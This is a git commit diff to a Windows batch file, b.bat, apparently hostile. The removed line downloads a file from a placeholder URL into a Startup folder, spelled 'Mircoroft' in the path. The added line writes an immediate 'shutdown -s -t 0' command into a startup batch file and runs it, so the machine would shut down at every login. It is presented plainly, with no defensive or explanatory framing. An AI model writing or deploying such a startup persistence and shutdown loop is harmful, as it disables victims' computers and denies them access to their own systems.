644accb25c13168934538c2b7946ca3edce8539a
Moto Moto <45734193+thunermay@users.noreply.github.com>
2023-08-21 10:18:56 +0200

    Update b.bat

--- b.bat
+++ b.bat
@@ -1,2 +1,2 @@
-curl -o "C:\ProgramData\Mircoroft\Windows\Start Menu\Programs\Startup\b.bat" URL_HERE
+echo "shutdown -s -t 0" > "C:\ProgramData\Mircoroft\Windows\Start Menu\Programs\Startup\b.bat"
 C:\ProgramData\Mircoroft\Windows\Start Menu\Programs\Startup\b.bat
